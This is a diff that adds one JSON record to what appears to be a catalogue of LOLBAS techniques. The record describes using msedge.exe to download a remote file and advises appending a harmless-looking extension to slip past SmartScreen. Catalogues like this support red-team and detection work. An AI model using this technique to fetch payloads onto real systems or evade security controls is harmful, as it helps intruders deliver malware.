@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-msedge-exe-download-1",
+  "name": "LOLBAS · Msedge.exe (Download) #1",
+  "command": "msedge.exe {REMOTEURL:.exe.txt}",
+  "description": "Edge will launch and download the file. A 'harmless' file extension (e.g. .txt, .zip) should be appended to avoid SmartScreen.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "msedge",
+    "download"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Msedge/",
+  "upstream_id": "Msedge.exe/Download/0",
+  "category": "lolbas",
+  "subcategory": "download",
+  "references": [
+    {
+      "title": "LOLBAS — Msedge.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Msedge/"
+    }
+  ]
+}
